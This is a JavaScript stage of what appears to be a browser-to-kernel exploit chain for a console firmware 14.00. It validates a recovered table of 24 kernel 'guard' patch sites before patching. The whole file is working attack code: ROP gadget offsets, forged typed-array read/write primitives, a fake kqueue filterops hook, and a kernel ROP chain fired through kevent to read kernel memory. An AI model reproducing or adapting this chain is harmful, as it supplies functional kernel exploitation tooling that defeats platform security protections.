// Stage GUARD READ v1: validate the recovered 24-site guard table on the live
// kernel.
//
// artifacts/guards.json was recovered from hen.bin's cmd-0035..0042 templates.
// Before anything is patched, read every site through the ROP read primitive
// and compare the low `len` bytes with the recorded stock value. A full match
// means the table really describes this 14.00 kernel; a mismatch means the
// table must not be used to patch.
//
// 24 reads do not fit in one chain (the chain cap is 112 qwords), so they run
// in three fires of eight. No setsockopt, no rotation: reuses the live hook.
var result, n, f, dv, saved, phase = "preflight";
var st = null, fake = 0, ops = 0, gSTACK = 0, gRES = 0, gMARK = 0, gCTX = 0;
var gDUMP = 0;
var forged = null, carrier = null, carrierSlot = -1, carrierOriginal = null;
var KBASE_LO = 0;
var R_RET0 = 0x349ee, R_TOUCH = 0x73e886;
var R_POPRSP = 0x1c9dc, R_SAVE = 0x2be040, R_REST = 0x2be070;
var R_CONT = 0xe4f40, R_PRAX = 0x1ca05, R_PRDX = 0x184ab2;
var R_PRDI = 0x3b0a2a, R_LDRAX = 0x6aaf3, R_ADDRAX = 0x3fc327;
var R_STRDIRAX = 0x2f1cb;
var Z8 = [0, 0, 0, 0, 0, 0, 0, 0];
var MARK = [49, 74, 84, 79, 79, 82, 77, 77];
var GIDENT = [49, 90, 84, 82, 80, 75, 52, 49];
var M120 = [136, 255, 255, 255, 255, 255, 255, 255];
// { rva, len, stock } from PROJECT_STATUS/artifacts/guards.json
var GUARDS = [
  { rva: 0x4c2, len: 1, stock: 0x72 },
  { rva: 0xacd, len: 1, stock: 0x76 },
  { rva: 0x2bd79d, len: 1, stock: 0x76 },
  { rva: 0x2bd7e1, len: 1, stock: 0x76 },
  { rva: 0x2bd85d, len: 1, stock: 0x76 },
  { rva: 0x2bd8a1, len: 1, stock: 0x76 },
  { rva: 0x2bda4d, len: 1, stock: 0x76 },
  { rva: 0x2bdefd, len: 1, stock: 0x76 },
  { rva: 0x2bdfcd, len: 1, stock: 0x76 },
  { rva: 0x391fc6, len: 1, stock: 0x74 },
  { rva: 0x4b5, len: 2, stock: 0x1372 },
  { rva: 0x4b9, len: 2, stock: 0x0f75 },
  { rva: 0x1b7504, len: 2, stock: 0x840f },
  { rva: 0x1b7a43, len: 2, stock: 0x850f },
  { rva: 0x1b7a53, len: 2, stock: 0x840f },
  { rva: 0x1b7a73, len: 2, stock: 0x840f },
  { rva: 0x1b7ab8, len: 2, stock: 0x820f },
  { rva: 0x2fcb5c, len: 2, stock: 0x850f },
  { rva: 0x628684, len: 2, stock: 0x0774 },
  { rva: 0x628f6f, len: 2, stock: 0x4175 },
  { rva: 0x1faada, len: 1, stock: 0x33 },
  { rva: 0x1faadd, len: 1, stock: 0x33 },
  { rva: 0x490, len: 4, stock: 0xffffffff },
  { rva: 0x3be3c0, len: 4, stock: 0xe5894855 }
];
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a || !state.view ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !Number.isInteger(state.index))
    throw new Error("caller_missing");
  st = window.__fw14StageF;
  if (!st || typeof st.fake !== "number" || typeof st.ops !== "number" ||
      typeof st.gSTACK !== "number" || typeof st.gMARK !== "number" ||
      typeof st.gCTX !== "number")
    throw new Error("stage_f_state_missing");
  KBASE_LO = st.kbaseLo || window.__fw14KbaseLo;
  if (!Number.isInteger(KBASE_LO) || KBASE_LO <= 0 || KBASE_LO > 0xffffffff)
    throw new Error("kbase_missing");
  var need = ["kevent", "kqueue", "getpid"];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number")
      throw new Error("wrappers_missing_" + need[mi]);
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  fake = st.fake;
  ops = st.ops;
  gSTACK = st.gSTACK;
  gRES = st.gRES;
  gMARK = st.gMARK;
  gCTX = st.gCTX;
  gDUMP = st.gDUMP || (fake + 6400);

  forged = state.view;
  carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  function bytesAt(index, count) {
    var out = [];
    for (var i = 0; i < count; i++) out.push(forged[index + i]);
    return out;
  }
  function valueOf(bytes) {
    var v = 0;
    for (var i = bytes.length - 1; i >= 0; i--) v = v * 256 + bytes[i];
    return v;
  }
  function pointerBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  carrierSlot = addressOf(carrier) - base + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  carrierOriginal = bytesAt(carrierSlot, 8);
  function setCarrier(addr) {
    var next = pointerBytes(addr);
    for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
  }
  function restoreCarrier() {
    for (var i = 0; i < 8; i++)
      forged[carrierSlot + i] = carrierOriginal[i];
  }
  function poke(addr, bytes) {
    setCarrier(addr);
    for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
    restoreCarrier();
  }
  function peek(addr, count) {
    setCarrier(addr);
    var out = [];
    for (var i = 0; i < count; i++) out.push(carrier[i]);
    restoreCarrier();
    return out;
  }
  function pokeQ(addr, bytes) { poke(addr, bytes); }
  function peekQ(addr) { return peek(addr, 8); }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var i = 0; i < left.length; i++)
      if (left[i] !== (right[i] & 255)) return false;
    return true;
  }
  function kq(rva) {
    var lo = KBASE_LO + rva;
    if (lo > 0xffffffff) throw new Error("kva_overflow_" + rva);
    return [lo & 255, (lo >>> 8) & 255, (lo >>> 16) & 255,
            (lo >>> 24) & 255, 0xff, 0xff, 0xff, 0xff];
  }
  function u64b(value) { return pointerBytes(value); }
  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function hex16(bytes) {
    var out = "";
    for (var i = 7; i >= 0; i--)
      out += ("0" + (bytes[i] & 255).toString(16)).slice(-2);
    return out;
  }
  function isBytes(v) { return v && typeof v === "object" && v.length === 8; }
  function addBytes(bytes, delta) {
    var out = bytes.slice(0), carry = delta;
    for (var i = 0; i < 8 && carry > 0; i++) {
      var v = out[i] + (carry % 256);
      out[i] = v & 255;
      carry = Math.floor(carry / 256) + (v >> 8);
    }
    return out;
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  // ------------------------------------------- re-install fake filterops
  phase = "ops";
  pokeQ(ops, Z8);
  pokeQ(ops + 8, kq(R_RET0));
  pokeQ(ops + 16, kq(R_RET0));
  pokeQ(ops + 24, kq(R_RET0));
  pokeQ(ops + 32, kq(R_TOUCH));
  var opsOk = same(peekQ(ops + 32), kq(R_TOUCH));

  // ------------------------------------------------ kqueue + initial add
  phase = "kqueue";
  var kqRes = n.call("kqueue", []);
  if (kqRes.value < 0) throw new Error("kqueue" + eTag(kqRes));
  var kqFd = kqRes.value;

  f.fill(0, 0x900, 0x940);
  for (var gi = 0; gi < 8; gi++) f[0x900 + gi] = GIDENT[gi];
  dv.setInt16(0x908, -23, true);
  dv.setUint16(0x90a, 1, true);
  phase = "initial_add";
  mark("gr_initial_add");
  var addRes = n.call("kevent",
    [kqFd, n.frameAddress + 0x900, 1, 0, 0, 0]);

  // ------------------------------------------------------- chain builder
  function makeChain(extra) {
    var chain = [];
    function emit(b) { chain.push(b); }
    function emitU(v) { emit(isBytes(v) ? v : u64b(v)); }
    function kb1() {
      emit(kq(R_PRAX)); emit(MARK);
      emit(kq(R_PRDI)); emitU(gMARK);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRAX)); emitU(gCTX + 16);
      emit(kq(R_LDRAX)); emitU(0);
      emit(kq(R_PRDX)); emit(M120);
      emit(kq(R_ADDRAX)); emitU(0);
      emit(kq(R_PRDI)); emitU(gCTX + 8);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRAX)); emit(kq(R_CONT));
      emit(kq(R_PRDI)); emitU(gCTX + 56);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRDI)); emitU(gCTX);
      emit(kq(R_REST));
    }
    emit(kq(R_PRDI)); emitU(gCTX); emit(kq(R_SAVE));
    extra(emit, emitU);
    kb1();
    var bytes = [];
    for (var qi = 0; qi < chain.length; qi++)
      for (var bi = 0; bi < 8; bi++) bytes.push(chain[qi][bi]);
    if (chain.length > 112) throw new Error("chain_long_" + chain.length);
    return { bytes: bytes, qwords: chain.length };
  }
  function fire(chain) {
    poke(gSTACK, chain.bytes);
    pokeQ(gMARK, Z8);
    f.fill(0, 0x900, 0x940);
    for (var gi2 = 0; gi2 < 8; gi2++) f[0x900 + gi2] = GIDENT[gi2];
    dv.setInt16(0x908, -23, true);
    dv.setUint16(0x90a, 1, true);
    var poprsp = kq(R_POPRSP);
    for (var pi = 0; pi < 8; pi++) f[0x920 + pi] = poprsp[pi];
    var stackB = u64b(gSTACK);
    for (var si = 0; si < 8; si++) f[0x928 + si] = stackB[si];
    var rc = n.call("kevent",
      [kqFd, n.frameAddress + 0x900, 2, 0, 0, 0]);
    return { rc: rc, mark: same(peekQ(gMARK), MARK) };
  }
  function readStep(emit, emitU, src, dst) {
    emit(kq(R_PRAX)); emitU(src);
    emit(kq(R_LDRAX)); emitU(0);
    emit(kq(R_PRDI)); emitU(dst);
    emit(kq(R_STRDIRAX)); emitU(0);
  }

  // ------------------------------------------------------- read guards
  var raw = [], reads = 0, dead = -1;
  for (var batch = 0; batch < 3; batch++) {
    phase = "read" + batch;
    mark("gr_read" + batch);
    var start = batch * 8;
    var count = Math.min(8, GUARDS.length - start);
    var rRes = fire(makeChain(function (emit, emitU) {
      for (var ri = 0; ri < count; ri++)
        readStep(emit, emitU, kq(GUARDS[start + ri].rva),
                 gDUMP + ri * 8);
    }));
    if (!rRes.mark) { dead = start; break; }
    for (var ri2 = 0; ri2 < count; ri2++) {
      raw.push(peekQ(gDUMP + ri2 * 8));
      reads++;
    }
  }

  // ------------------------------------------------------- compare
  var matched = 0, mismatched = [];
  var lines = [];
  for (var i = 0; i < raw.length; i++) {
    var g = GUARDS[i];
    var ok = true;
    for (var bi3 = 0; bi3 < g.len; bi3++) {
      var want = Math.floor(g.stock / Math.pow(256, bi3)) & 255;
      if (raw[i][bi3] !== want) ok = false;
    }
    if (ok) matched++;
    else mismatched.push(i + ":got" + hex16(raw[i]).slice(-2 * g.len) +
                        "/want" + ("00000000" + g.stock.toString(16)).slice(-2 * g.len));
    if (i < 8 || !ok)
      lines.push(i + "=" + hex16(raw[i]));
  }

  // ------------------------------------------------------- outcome
  phase = "outcome";
  for (var ri3 = 0; ri3 < saved.length; ri3++) f[0x200 + ri3] = saved[ri3];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a &&
    bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");

  window.__fw14StageGuards = {
    raw: raw.map(function (b) { return b.slice(); }),
    matched: matched, dead: dead, kbaseLo: KBASE_LO, pid: pid
  };
  result = {
    id: "stage_guard_read_v1",
    status: (dead < 0 && matched === GUARDS.length && intact) ? "pass" : "fail",
    details: {
      pid: pid,
      ops: (opsOk ? "ok" : "bad") + "/kq" + kqFd + "/add" + eTag(addRes),
      read: reads + "/" + GUARDS.length + (dead >= 0 ? "/dead@" + dead : ""),
      matched: matched + "/" + GUARDS.length,
      mismatch: mismatched.join(";").slice(0, 300),
      raw: lines.join(",").slice(0, 500),
      state: dead >= 0 ? "dead" : "stock",
      intact: intact
    }
  };
} catch (e) {
  result = {
    id: "stage_guard_read_v1",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 220) }
  };
} finally {
  try { if (forged && carrierSlot >= 0 && carrierOriginal)
    for (var ci = 0; ci < 8; ci++)
      forged[carrierSlot + ci] = carrierOriginal[ci]; } catch (ignore) {}
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
